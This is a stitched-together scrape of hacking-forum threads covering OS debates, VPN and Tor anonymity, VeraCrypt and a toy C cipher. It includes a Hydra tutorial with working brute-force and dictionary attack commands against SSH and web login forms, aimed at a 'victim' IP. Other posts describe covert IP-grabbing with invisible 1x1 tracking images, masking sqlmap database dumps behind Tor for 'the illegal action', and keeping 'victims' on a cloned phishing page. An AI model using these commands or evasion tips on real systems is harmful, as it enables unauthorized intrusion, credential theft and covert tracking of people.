I can really work best on Mac, especially if it has the trackpad gestures etc., it's a really capable environment for me. I don't really play hardcore games much, as most of them are not available in OS X, or my computer is not that powerful, but I can always restart in Windows (Bootcamp) and play whatever I need there.   This is just my personal opinion, and what I find easier to use, others prefer Windows, other prefer Linux. You can't change their eyes.  Quote by Phage  Gaming is a waste of time anyway.     Just your opinion. Others find games fun, entertaining and that's how they spend their time. You may not enjoy them, but others do. I don't see how it's a waste of time.

I have more laptops than you have fingers. I get it, what you think though.   Might be TLDR for you but its relevant and detailed.  • http://itvision.altervista.org/why.linux.is.not.ready.for.the.desktop.current.html   • https://www.reddit.com/r/linux/comments/4myrel/touch_screen_readiness_of_linux_desktop_in_2016/    This happens alot, people get defensive of their personal choice in OS and take up some personal vendetta to make sure everyone knows it. This inst what OP is about. More specifically its about Privacy and Windows 10.. not privacy and Linux, or why Mac is so uberelite.    At the end of the excellent tutorial on increasing privacy on Windows 10 you get your typical 'thats why I use Linux", "thats why I use Apple", "thats why Windows suxors".   I come up with valid reasons why its important for anyone serious about the field of IT to not ditch Windows because like it or not, alot of organizations rely on software that runs on Windows.

I would love to move to Linux full time but I find that when I tried I had problems with graphic drivers, I did not like the choice of IDEs for C, C++ and because of my graphic driver issues some programs had some sort of grainy background. Whereas Windows did not have any of these problems, I consider the problems in which I just mentioned to be basic needs. I'm not running Linux down but I just wish it would get more support, I would love to move to Linux but Windows just handles very simple and basic needs so much better. It's 2016 not 1992 I want full graphic card support, I want better software and hardware support. Its like a couple of months a go I tried to switch to Linux on my laptop, I ended up getting hamming bars going down the screen, at first I thought it was my laptop screen but I installed Windows and it was fine. Maybe one day Linux will be ready for me          Edited by Katheudo (Tuesday 23rd of August 2016 09:15:27 PM)

And games are very much a waste of time... How does it benefit to your career? Unless you're a pro e-sports player, games will be a waste of your time. Time you could've spent progressing your skills.
@Phage   I think I have to agree with you about playing games, I use to be an avid gamer on the PC and on the console. I always use to feel like I just wasted my time which could of been spent learning about programming and my skills for the future. We only have a sort life here, I always say to my friends don't you think we are wasting our time playing games where we could be making a game, website or application; making a difference and doing something that others want to use rather than just sit here button smashing. He didn't really have the same passion or inspiration as I did.   Anyway I stopped playing games altogether now and I only use my computer for programming, university work, YouTube and watching the odd movie or TV show when I have the time. I have not played a game for nearly a year now, I still can if I wanted to as I still have my computer which is capable of playing games but I don't have the urge to anymore.   I must say that I feel this was a great move for me as I have improved so much in programming and with computers which helped with my university work as well. But I do still find myself procrastinating quite a lot, which I hate and really want to get over so that I can get more work done.   However, I do want to say that playing games is not a total waste of time for people as it is a way to relax and enjoy being with friends, family etc... Plus it is a way to socialize and mess around online. I think if you are a person in which wants to achieve great things in life then gaming is good but only in moderate douses otherwise you start to lose focus on what you really want to be working on.

@0E800 You have a good point. That is why I stated it was good in moderation like most things I guess.   But my IDE loves me though? 
Not sure if this was included in OP. I feel like its necessary to secure your Windows 10 box by removing your user details from the login screen.    Hacker: "Hmm, I dont know the password...but, at least I have their email account."     From this:     To this:    Edit the Registry to Hide Your User Information:   • Type "regedit" in the Windows search bar [Enter].   • Navigate to HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System   • Double-click dontdisplaylastusername   • Change the 0 to 1 in the Value data field.[OK]   • Right-click an empty area in the right panel and select New > DWORD (32-bit) Value   • Enter DontDisplayLockedUserID for the DWORD name.   • Double-click DontDisplayLockedUserID   • Change the 0 to 3 in the Value data field. [OK]   When you reboot you'll need to fill in both your username  and your password to get on the system.   Alternative method:     •  Press Windows Key + R then type gpedit.msc    •  Go to "Computer Configuration" -> "Windows Settings" -> "Security Settings" -> "Local Policies" -> "Security Options"    •  Find Interactive logon: Do not display last user name    •  Set it to "Enabled"   Source: http://www.howtogeek.com/245944/how-to-hide-your-personal-information-on-the-windows-10-login-screen/          Edited by 0E800 (Wednesday 31st of August 2016 07:51:20 PM)
@0E800 for starters I said in the guide that you should not even use an online account to login, you should only use a local account where it would just display a name with a password box. But still a good point, nice find! I really don't see the point in using a online email account to login, doing so makes all other privacy tweaks kinda pointless.
HOW TO START? In this tutorial,i gonna show you hoiw you can in easy way crack ports and online websites passwords.  before we start,we need do install hydra(application for cracking passwords)  to do that just open terminal and write ,,apt-get install hydra''  After you do this,you can proceed to the nest steps  Brute force attacks with Hydra  Brute force attack means trying get into the system by using every possible combination of letters and numbers.  Its much slower than the dictionary attacks,that I will present later in this tutorial,but by using a brute force attack you have 100% of certainty that you will find the right password  To brute force open port password using hydra use following command: Codehydra -l [login] -V-x 4:4:aA1 [ip_address] [port_name]            .CodeMirror {height: auto;}      var element = document.getElementById("code-W3Joz7hfGJ");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });      Legend:  hydra- its indicates,that to crack the password you are using the application hydra  -l [login] - it shows the login to the account you want to crack password to.In the place [login] you can put word,like ,,admin'' or you can put lowercase L and put text file instead.like ''logins.ls''  -V means verbose,its used to show you all of the attepts the hydra is making during the attacks  -x 4:4 means minimum and maximum letters in passwords,in this case hydra will try only password 4 characters long,you can change it as you wish. :aA1] means letters used in generated passwords,if you want you can add special characters like !@#.,  [ip_Address] - in this place input the ip of your victim ,you can get the ip by pinging the website.  [Port_name]- you should input there the name of port you want to crack: ssh,ftp,smtp,telnet etc    Example:  Codehydra -l root -V -x 1:5:aA 85.193.127.223 ssh            .CodeMirror {height: auto;}      var element = document.getElementById("code-93xleLD4Zx");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        Thats all! easy,isnt it?    Dictionary attacks with Hydra  Dictionary attack is trying to crack the password with list of logins and/or passwords.  hydra will try all of the words on the text file and check if any of them is correct.  Its much faster than brute force atacks,but there is a possiblity,that correct password will not be in your dictionary.  Dictionary attack open port password using hydra:  Codehydra ]-L logins.txt ]-P passwords.txt ip_address port            .CodeMirror {height: auto;}      var element = document.getElementById("code-jJe4ikemZr");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });       -L logins.txt - Uppercase L indicates,that you are using login lists instead of a single word.In the place of logins.txt put the name of your dictionary  -P passwords.txt - As before,uppercase P signalises that you are using password list,in the place of passwords.txt put the name of your dictionary   Example:  Code hydra -L usernames.txt -P rockyou.ls 85.193.127.223 ssh            .CodeMirror {height: auto;}      var element = document.getElementById("code-eqd1QdOl1F");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });       How to crack an online website password:  Its a little harder than cracking the ports passwords,because to do this you need to know at least basics of html language.   1.before you start cracking,we need to get some information about the website you are going to hack.  First,we need to get the ,,login script''. U can intercept it with Burp suite(installed in kali) or try to find it manually.   2.when you get the script,you also need to get the bad login response.When you try to login with wrong password the server should leave you a message like ,,invalid password''. just remember it.Its very important for hydra to work correctly,without that hydra wont know what passwords are correct.If you have that,you got all the information to start cracking.  Codehydra -L <username_list> -P<password list>[ip] http-post-form "[login_script][:]username=^USER^&password=^PASS^&Login=Login:[Failed_login_message]            .CodeMirror {height: auto;}      var element = document.getElementById("code-4kw0ttFYPx");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });       [login_script] - there you input the name of the file from step 1  [Failed_login_message] - there you post your response from the step 2  ^USER^ tells Hydra to use the username or list in the field]^PASS^ tells Hydra to use the password list supplied   example: Codehydra -L usernames.txt -P passwords.txt 192.168.1.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"            .CodeMirror {height: auto;}      var element = document.getElementById("code-0MYw71zhqs");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });       Thats all for now what you need to know about password cracking,i hope you enjoyed,that was my first tutorial and i not really good at this,but i thought that i can try.See ya          Edited by Thundery (Tuesday 13th of September 2016 09:22:09 PM)

I was trying to break into my own router as a test and was suggested to use hydra. But when I go to router page it only asks for password and there is no login. Unfortunately, hydra doesn't give option to avoid login names, only use of user list or specific user. Presumably there is a hard-keyed root/admin/changeme etc, but I cannot be sure. Can you, please, suggest other software or the way round my problem?

Or you can use a real image and link them to a server you control and then just view the access logs
Quote by x_XOr you can use a real image and link them to a server you control and then just view the access logs   Most forums don't allow you to do that (insert href to image). This only works if you own the website you're posting the image on.   If I am correct, you mean upload the image on Imgur for example, and then use some href parameters and post the site on a forum. This won't work, because most forums don't allow that, and also you have to click on the image to get the IP recorded.   Using this method, as soon as the image is viewed, it gets recorded into the logs.
I believe he is referring to a pixel tracker / html beacon  which I am fairly sure evilzone has an image proxy or only displays images hosted on upload.evilzone to discourage the use of.   The point is to hack a website or any computer natd and create the site that will hosts your pixel tracker. Use email or social media and get people to visit your site or image you posted and collect your future clients.    Review:   http://www.fissionads.com/university/facebook-pixel-tracking-101/  https://m.facebook.com/business/help/460491677335370   Sounds like a good tut. I'm sure you could use a one liner python command to create it.  Or use a tool like fiddler.

Additionally if you have your own server you can just link to a redirect script which still logs IP address the same way the sites you linked do.
Yes, they allow signature with external URL linking enabled. But you would have to click the image to get the IP recorded. With the site I linked you just load the site and have the IP recorded. What I did once, was create a 1x1 image, that was literally invisible, so I could grab IPs without anyone even suspecting a thing.
If you include the image in image tags it'll be automatically rendered by the browser and thus the IP will be logged. It's the same thing you are mentioning except you don't have to trust a 3rd party with your data collection

Admins, you gotta make the Registration Challenges harder...
Hello, what I've seen here on Evilzone is that many newcomers want to hack the web and do some blackhat things, that's fine for me but I don't recommend you to. Since the cost of a dumped database is pretty darn expensive and the owner will do anything to get that money from you with a law suite.  You might allso forget that there is hackers out there that might be targeting YOU right now, so you might want to secure your system before you even think about taking that black hat on and go offensive on the internet.   So I'll try to point the beginners in the right direction here, to make your system more secure.  Notice I wrote "more secure", because when you think "I'm safe and sound" you're wrong, there is allways a way in, and you should be aware of that.  Use a trustworthy VPN service provider!  It's hard to find a good VPN service that doesn't logg your IP adress today, so you have to find a service that you trust!  You can find a really great VPN comparison chart on the following link https://thatoneprivacysite.net/vpn-comparison-chart/  A VPN stands for Virtual private network and acts like a tunnel for your connection. In short, your ISP will only see traffic to the VPN servers and from there the data is unvisible for the ISP. This goes for website owners aswell, they will only see the VPN service IP in the logs when you visit their site.   Use a firewall to filter out bad incoming/outgoing traffic. A firewall is pretty much a must have to secure your system from unwanted incoming traffic such as a targeted attack or a RAT (Remote administration tool) for example. I won't explain what a firewall is doing in depth since I bet you have the basic understanding of what a firewall does to secure your network/system.  What I will do is to give you an advice to download a free and great free firewall here if you don't use one today or want to use a firewall that is doing the job with less system requirements!  Glasswire is the name, and you can read more about it here and download it on the following link. https://www.glasswire.com/  Stay safe from malware/virus  Use anti malwarebytes and scan the system frequently (at least once a week) to stay safe from most malwares that might have gotten in to your system. An active anti virus software is good, but not a must if you know what you're doing. I've been using my system a long time without any AV now and that is because I stay aware of what I click on and use a virtual machine for weird stuff that I want to run/install.   You should use addons to firefox and chrome to make the web more secure while sufring aswell.  HTTPS everywhere  Privacy Badger  WebRTC Leak prevent  uBlock origin    So what is a virtual machine?   It's in short a computer running virtually inside of your system. If you get a virus on that machine and totally lose control of it, you can just shut it down and reinstall it without your main system getting infected.  You can download wmvare palyer or virtual box and install any system you like to it.  Link to vmware workstation player https://my.vmware.com/en/web/vmware/free#desktop_end_user_computing/vmware_workstation_player/12_0    Lets say you want to run Kali linux 2 in vmware player, you just download the kali image file from the following link. This image is ready to go directly in vmware player without any installation. Realy fast and easy!   Just do as I did in the picture and find to the kali linux vmdk file to run.     Download the Kali linux 2.0 image here. https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/  There is a lot of ISO files and vmware player ready images out there for allmost any OS, so you can set up an windows machine for pentesting, running strange softwares on and such to be sure that your host computer is safe from bad code.  This is some very basic security measures that you should be using as a beginner. I hope you learned something and I will try to answer any questions   that you might have.   Ofcourse there is more than just this, like system encryption and encrypted containers for securing your personal data aswell. But I think that is a whole new tutorial since it's to much to go through.   Have a great day!   /ak47          Edited by ak47 (Wednesday 31st of August 2016 03:50:08 PM)
Good post explaining it well! You can also use vpn + proxy thru tor while for example dumping a sql db with sqlmap.
Yes you can, but that's for another tutorial I think. Nice to see you here my friend Idomin
I would just quickly like to state that a VPN will only keep you "secure" because it ensures your traffic is encrypted to the source, even if your current network is potentially untrusted. VPNs provide privacy of data, not anonymity of the user.   For a good VPN provider I recommend Private Internet Access

VPNs provide privacy of data, not anonymity of the user.   For a good VPN provider I recommend Private Internet Access  Moreover a VPN does provide anonymity to the user and data, but in regards to the privacy policy of the VPN service provider and if they keep traffic logs or not... Once your connection researches the VPN server it is open to the internet, meaning it is your responsibility to which services you access on the other side of the VPN to ensure your own privacy.

Yeah,  it's very important to trust the VPN provider about the logs as I wrote.   I trust my VPN provider since I know one of the guys working on it, and even the police have tried to get some information from this provider without any luck.

The purpose of a VPN is _not_ to obscure your IP address but to provide a safe, encrypted tunnel for your information to pass through so that you are sure your data is encrypted in transit. This provides Privacy to the user because between the user and the endpoint all data is encrypted.   Anonymity is just that, hiding the source of the traffic. This is what proxies are used for and also why many people recommend using a combination of both Tor (a proxy) and a VPN

@x_X   I don't mean to bash but what are you going on about! A VPN does provide a anonymity and is used to obscure your IP address. Most VPN services use static IP addresses and even if they change that is a benefit to you anyway as you are using a different IP from your ISP's assigned IP address. The only thing that you should be worried about is if you can trust your VPN service if they keep traffic logs and what their privacy policy says. Using a proxy or Tor before a VPN is totaly pointless as it makes the connection even slower and when using a VPN you should be using the strongest encryption setting.   While on the VPN you are protected and are anonymous, your location is hidden, your source IP is hidden, your data is hidden.   A VPN does provide anonymity.

Actually I have no decrease in connection speed with my VPN service. And it uses AES-256-CBC crypto behind a 2048 bit Diffie-Hellman key which makes it super safe. The provider is Swedish tho, and have alot of servers here so that might be the reason why I don't lose any connection speeds.

Sry for being so slow. I've been using this VPN provider without any WebRTC too see what effects it would have, and my IP didn't leak out even then. It just gave me a strange IP at the providers server anyway. Might be the DNScrypt function doing that tho.                       Edited by ak47 (Thursday 1st of September 2016 03:18:10 AM)
@ak47   Sorry I meant to use the word "before" instead of "because". Meaning that using Tor or a Proxy before a VPN is pointless and makes the connection even slower. I was not saying that using the strongest setting makes the connection noticeably slower.

Fast internet or staying hidden  But I get what you mean, I don't use both all the time either.  While using for example sqlmap for dumping a database it's allways a great idea to put on an extra layer of safety with a Tor proxy while running the illegal action you know.

Fast internet or staying hidden  But I get what you mean, I don't use both all the time either.  While using for example sqlmap for dumping a database it's allways a great idea to put on an extra layer of safety with a Tor proxy while running the illegal action you know.    Yeah I totally understand for that purpose.   But be careful when using a proxy or Tor connection as well as a VPN as in some cases such tor or proxy services either log your access times, while logging your IP address if they are compromised or hosted by government services like the NSA or FBI. Meaning if you hacked a website for example while using a proxy >= VPN then they might be able to track that VPN connection through the proxy service using the IP logs and access times back to your ISP IP. Just something to note.

I was not saying that using the strongest setting makes the connection noticeably slower.    The reason for Tor + VPN is that if you leverage Tor as an initial proxy, it hides your IP even from the VPN host. The VPN then encrypts your traffic to the endpoint. This also has the side-effect that if someone were to snoop, they would see a Tor endpoint IP and have to trace through the darkweb to find your source IP. Sadly, Tor overall is a fairly slow protocol so Tor -> VPN -> Target can sometimes be incredibly slow but at least your origin is hidden and your data in transit is encrypted.    In the end, your tradecraft and operational security depend entirely on your threat model and who you think you'll piss off enough to come after you. If you think you're doing enough to piss of a government, prepare to hide behind every possible barrier you can. If you're just trying to avoid getting pinpointed by your standard sysadmin, a few proxies tends to be enough
Holy shit I see a lot of misunderstandings regarding proxies, VPN's and Tor.    x_X is 100% correct in his statement regarding VPN's not providing anonymity. It will always be clear that you as an individual has connected to that single VPN. When that's known, it doesn't matter whether the VPN provider has 1 or 10 IP addresses you bounce though, it won't be hard to trace the traffic back to you.    Tor is a great way to achieve somewhat anonymity. You connect to Tor and it randomly throws your connection (encrypted btw) around different nodes until the traffic reaches out through an end-node. That combined with the mass of people using Tor makes it pretty secure. You're hiding in the masses.    No point in explaining why Tor -> VPN is the correct way to go about it, since x_X already did that.   Furthermore, I advice you guys to watch these videos to clear up most of your misunderstandings.   https://www.youtube.com/watch?v=S8GPTvq1m-w  https://www.youtube.com/watch?v=J1q4Ir2J8P8         Edited by Phage (Thursday 1st of September 2016 11:54:34 AM)
mhmm, that first video "OPSEC: Because Jail is for wuftpd - The Grugq" was really interesting and educational!
You could say the same thing about VPNs, you are hiding with the masses. 1000's of people could be connected to the same IP and location. Your VPN connection is encrypted thus, even if someone saw that you connected they cannot tell what you are doing and many people could be connected to the same server. Plus in the past Tor has had issues where some have been able to trace you back. Like when the FBI supposedly paid that university to try and break Tor.  The only possibility a VPN might be able to catch you out is if they log and keep access times, but your suppose to choose a service which you somewhat trust.

Tor is far from the only way to chain a few proxies together. You can buy into a proxy rotation service, make your own proxies (use your imagination), or if you're ballsy and just wanna hide your IP you can even use public proxies.

Meaning, they'll every day snitch you out to save their ass. Tor makes this ten times harder for the node-operator to do, considering only the first node will know where you came from. And only the last node will know where you're doing.

I agree with you about no one will go to jail for you, but are you saying even though VPN serives say that they don't get any traffic logs they will still snitch you out? What if they don't keep any logs at all, what are they going to do then?

What if they don't keep any logs at all, what are they going to do then?   First, you're trusting them to not log (or even know how to tell if logs are enabled).   Next, could be logs at the server provider level, or the gag order is done at that level so they put a passive tap or equivalent on the server and even the VPN provider doesn't find out until months later when they have enough to convict. Or send a copy of all packets elsewhere in the (usually Cisco) router doing something like this - https://www.cisco.com/c/en/us/td/docs/routers/7600/ios/12-2SR/configuration/lawful_intercept/lawful-int--Book-Wrapper/76LIch2.html   Tor doesn't have that issue to that extent although there are other attacks possible such as timing attacks.   Timing attack is if they really want to come after you    None of this matters if you start blabbing about your Age, occupation, weather etc. in chat rooms, or you accidentally attached to your NIC and bypassed the entire proxy setup. Or do a Sabu and connect to a chatroom without enabling TOR with your hacker handle making it piss easy to figure out who you are.   Even better if you allow javascript; facepalm extremely hard if Silverlight/Flash is enabled somehow.  Drink Bleach if Java is enabled.

nice , i was using my idea i puted radio & music in the index page so the victime will stay in the page and still hooked while listening music 3:) hope you enjoy it
great idea, I was thinking of ways to keep them on.
havefun then , goodluck.
I usually copy the source code of the page and put it into a file myself , I tried the setoolkit method you mentioned above , but the page has no images . any ideas ?
Hmm that's really weird, I used this method to make the images appear, the source code into index.html usually ends up with missing images, If you tell me how exactly you set it up and what website you copied I can try to figure out the problem, no promises though
how do i open a terminal window?

VeraCrypt is software for establishing and maintaining an on-the-fly-encrypted volume (data storage device). On-the-fly encryption means that data is automatically encrypted right before it is saved and decrypted right after it is loaded, without any user intervention. No data stored on an encrypted volume can be read (decrypted) without using the correct password/keyfile(s) or correct encryption keys. Entire file system is encrypted (e.g., file names, folder names, contents of every file, free space, meta data, etc).  https://veracrypt.codeplex.com/         Edited by Axon (Tuesday 13th of September 2016 10:33:54 AM)

Quote by 0E800Who's using this? How does it compare to bitlocker?  https://selimbhy.wordpress.com/2016/05/22/windows-encryption-showdown-veracrypt-vs-bitlocker/  I use it to encrypt my entire system drive and portable hard drives and USBs. No problems at all, it is basically True Crypt continued and still open source
Veracrypt is good.   True crypt: WARNING: Using TrueCrypt is not secure as it may contain unfixed security issues  https://www.youtube.com/watch?v=WdiCati0FhM
Thanks for the knowledge share!
The security company QuarksLab has done an audit of VeraCrypt: https://ostif.org/the-veracrypt-audit-results/   They found 8 critical, 3 medium, and 15 low or informal vulnerabilities. VeraCrypt has issued a new version with fixes for these vulnerabilities, and OSTIF claims that VeraCrypt is now much safer as a result of the audit.
Veracrypt is the successor to truecrypt, the original truecrypt was abandoned and later it was independently audited by professional cryptographers and they found a few flaws.   The flaws seem to have been fixed in veracrypt, and it has gone through serveral independent code audits themselves.   I'm no crypto expert myself but from what I can see veracrypt seems relatively secure especially since all the code is opensource and the auditing process seems transparent to the public.   On that basis, I trust veracrypt and also a year or so ago I encrypted my 2 tb external hard drive using veracrypt. It took nearly 12 hours to encrypt the drive, but perhaps it was worth it. Only time will tell.
VeraCrypt has yet big impact on speed - encryption performance    CrystalDiskMark: 4K Q32T1  Without Encryption = 100% Speed  VeraCrypt Read = 15%  DiskCryptor Read = 98%

For those of you who like me have used previous versions of veracrypt, consider upgrading immediately to 1.19.  8 critical vulnerabilities have been found and one involving usage of GOST cipher which is soviet backed and not considered to be safe for use as well as attacks that allows an attacker to guess the key length.

I have used it. I won't post tools or software I haven't already installed myself.  That being said, it's always safer to run keygen or patches in a VM or sandbox.   I rely only the AV software installed on my workstation which is Malwarebytes Anti Malware and Eset NOD32.   In the future, so long as keygen is not dependent on the host, I will just post promotional keys so that users don't need to run the keygen.   I recommend reviewing below link and judge for yourself. Its a risk, but there are always ways to reduce it.  https://www.quora.com/Do-anti-virus-companies-report-false-positives-to-prevent-cracks-and-keygens-from-working          Edited by 0E800 (Friday 14th of October 2016 06:23:45 PM)
Antiviruses very often do report "hacking tools" as viruses. However, they also often contain viruses. Hacking tools that are not created and distributed by very known people, organizations or alike are always sketchy...
Would normally delete this but since 0E800 is the poster I am willing to keep it here if he has actually used and checked this out..   @0E800, have you actually used this? And hopefully investigated it a bit before doing so?   I would advice people to run this in a VM until we get some feedback from OP.

I am so sure torrent trackers have forum sections, I suggest you try them.   Unless 0E800 wants to take time and look around but I don't see it happening for a onetime leeching poster.

Great share! But what the hell happened to that Macbook? I am going to have to report you to the Apple Abuse Line
A aquiantance of mine that takes the bus with me learned I was in IT. He asked me if I could recover information from a macbook that had fallen out of a moving vehicle. Me being that guy that always likes other people's computers in my hands, I told I would give it my best shot.   The way in which the laptop was damaged is akin to the position of our own own moon and how it perfectly orbits our earth. If it has been bent or disfigured 1 cm closer I would have not been able to recover the information.   I was able to put the computer in clamshell mode and used the same adapter for my Surface Pro 3 to output the display to an external DVI monitor.    I recovered about 3 years worth of pictures or over 7000 images and also recovered 96gb of music.   I then told the guy I had to rip the laptop in half to recover the data and asked him if he wanted the pieces back or if I could ecycle them. He was so happy about getting his family pictures back, he told just throw it away.   Now I have a decent apple product, and from using it, I must admit... I owe phage an apology for giving him shit for being such a apple lover. The device works really well for only having a i5 and 4gb soldered memory.    I still wouldn't buy one but there is something about how smooth osx feels.          Edited by 0E800 (Friday 16th of September 2016 02:54:53 AM)
haha that is such a great story! I've never really used a mac myself much, but I will give Apple something OSX does look really good compared to Windows UI. Is the macbook your main PC?   From your post of your desktop, it gave me an idea... Maybe I should start a thread to show off what our setups look like, maybe even vote who's looks the best/worse etc... What do you think?   EDIT: Sorry I just realized I got a little off topic...                       Edited by Katheudo (Friday 16th of September 2016 03:37:15 AM)

I don't know what the second script is for really.   But since the forum is still "new", it would have been lovely if you made a concise post about bruteforcin passwords, what it can do, how it does it, its shortcomings, how to make it better then probable alternatives.   But still forbyour learning purposes, after researching on the topics I mentioned above, we need to see your custom hashing function, then move on to faster methods.   I expect a long educative article on this. :\

Nobody can know your exact level of skill. Reading code is something that comes naturally, i don't think it's an effective method of studying.   Either way, look for simple algorithms on github, caesar's cipher, binary search, etc..

Studying source code is important as it helps you to get better understanding of mistakes other people made in their assumptions of logic, design or programming practice in general. Not only can it help you learn from other people's mistake, but you can also learn some new things if you see elegant techniques being used and you haven't thought of doing things in such a way before.   A lot of the public malware sources that I saw on Github other than a few are very poorly coded, readability is a nightmare, little to no documentation. As for good programming practices, just forget it..it's not even designed to be maintainable. I'm not sure why that is the case, although there are exceptions but I think some of the malware authors just want to get the most bang for their buck while investing as little time as possible or perhaps they came from unprivileged background and were mainly self taught.    Anyway I agree that something needs to be done to make things more readable, but writing a program to do that can be quite challenging depending on the language you are dealing with. Also it will only work on a subset of languages and can't account for everything.   If you are using vim editor, you can type this to auto format or indent indent lines   Codegg=G            .CodeMirror {height: auto;}      var element = document.getElementById("code-ouF2xGwnX7");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        But that is not a solution to something that has been written poorly.

Code: c  #include <stdio.h>  char* filename(char *path);  char* filepath(char *path);  main()  {      char path[100];      char v;      printf("Enter Path: ");      gets(path);      printf("E(ncryption) / D(ecryption) :");      fflush(stdin);      scanf("%c",&v);      if(v == 'E' || v == 'e')          encrypt(path);      else if(v == 'D' || v == 'd')          decrypt(path);      getch();  }    void encrypt(char *j)  {      long i = 0;      char sys[150];      FILE *fp,*fkp;      printf("Encrypting file\nIt may take some time depending upon size");      fp = fopen(j,"rb");      fkp = fopen(j,"rb+");      char a;      while(fread(&a,1,1,fp) == 1)      {          a = a + i%6;          fwrite(&a,1,1,fkp);          i++;          if(i == 10000000)              break;      }      fclose(fkp);      fclose(fp);      printf("\nFile Encrypted sucessfully.");  }    void decrypt(char *j)  {      long i = 0;      char sys[150];      FILE *fp,*fkp;      printf("Decrypting file\n");      printf("It may take some time depending upon size");      fp = fopen(j,"rb");      fkp = fopen(j,"rb+");      char a;      while(fread(&a,1,1,fp) == 1)      {          a = a - i%6;          fwrite(&a,1,1,fkp);          i++;          if(i == 10000000)              break;        }      fclose(fkp);      fclose(fp);      printf("\nFile Decrypted sucessfully.");  }    char* filename(char *path)  {      char mv[150];      strcpy(mv,path);      char aj[50];      int i,j;      i = strlen(mv);      j = 0;      i = i-1;      while(mv[i] != '\\')      {          aj[j] = mv[i];          i--;          j++;      }      aj[j] = '\0';      strrev(aj);        return aj;  }      char* filepath(char *path)  {      char mv[150];      char aj[100];      strcpy(mv,path);      int i;      i = strlen(mv);      i = i-1;      while(mv[i] != '\\')      {          mv[i] = '\0';          i--;      }      strcpy(aj,mv);      return aj;  }              .CodeMirror {height: auto;}      var element = document.getElementById("code-DswNDSFOSQ");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/x-csrc",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        Compile the code Dev C/C++ or CodeBlocks or GCC compiler.

Oh for the love of god [ code=c++ ] tag your code and fix indentation.   Making your own crypto algorithms is a bad idea. This looks very very simple to break.
Quote by andeOh for the love of god [ code=c++ ] tag your code and fix indentation.   Making your own crypto algorithms is a bad idea. This looks very very simple to break.   Actually, the OP said he used C. Just to let you know.   And @j450n, please use more understandable variable names. It's easier to read as it is a good practice.    I haven't compiled it but it looks legit. Thanks for sharing.                       Edited by shady (Monday 12th of September 2016 04:28:03 PM)
I won't comment on the algorithm.  I'll make some points about the code.   1. Instead of gets() use fgets().  2. Instead of strlen(), use strnlen().   3. use fread() with a buffer/array. May give better read/write performance.  4. filename(), filepath() allocate 'aj' on the stack and return a reference to it ?. 'aj' is deleted on exiting the function. Use calloc().
You don't need to share an implementation of algorithm. Mostly it suffices to just share the pseudo code with the mathematical background
Own implementation is always a bad idea. Same goes out for custom algorithm in licensing system (facepalm).  I still don't understand why programmers don't get this part.. Think about it this way   Some decode function that you made doesn't have any protection you can decompile it and bingo you have the code, it's like reinventing the wheel (you obviously try to avoid that!!).  If you implant RSA crypto in your code you can work with public and private key. Making it really near impossible to brake. Unless you brute force the public key. Which will probably take forever if you have used at least a key size of 1024 bit.
I understand why you shouldn't create your own encryption implementation as it is not as thoroughly tested/ secure etc... etc... But what is wrong with someone trying to learn more about encryption, the only way we will learn about encryption is to start making small programs like OP has done, maybe we shouldn't be focusing on the easy negative point of "You should never make your own encryption..." instead we should mention that point but focus on the fact that we still need people to become encryption programmers later down the line, we will always need them, its not like we are going to keep using the same encryption methods 50+ years later, are we?    Its not just this thread where I see it all the time, but I think as computer enthusiasts we should encourage writing encryption programs more and more, at the end of the day its your own choice to which encryption program you use for production products, so what is wrong with people coding up their own? I am not saying they or you have to use it in production software but they are learning a new skill, we will always need encryption and if more and more people try and don't get put off because they get told all the time they should stop what they are doing because it is not safe/ secure, then we won't have any decent competition anymore. Just because better, more tested and trusted solutions exist, we should never discourage people who have interests in encryption to not bother; yes there program probably will be riddled with bugs and security holes, but every program is never perfect the first time.    My main point is that fact that OP has done some coding in C/C++ which most people probably would not have bothered because the fact that they know they will always get told the same thing about "Making your own encryption is a bad idea", yes any person with common sense would never use his code to encrypt something to be secure, but at least OP has showed some interest in the field of encryption. I always think its always better to do it yourself instead of using other peoples creations if and when you can, of course its your own responsibility to ensure the thing you make is safe, secure and whatever... But you would of done something yourself...   I'm not having a go or targeting anyone but I think we should focus more on encouraging people to learn about encryption and to push people in the right direction of making a secure algorithm.   Sorry for the long rant
There's a fine line between submitting code as an intro post and getting recognition for it. Very few join with code. Me personally, I give you credit for sticking your neck out. Keep up the good work mang.
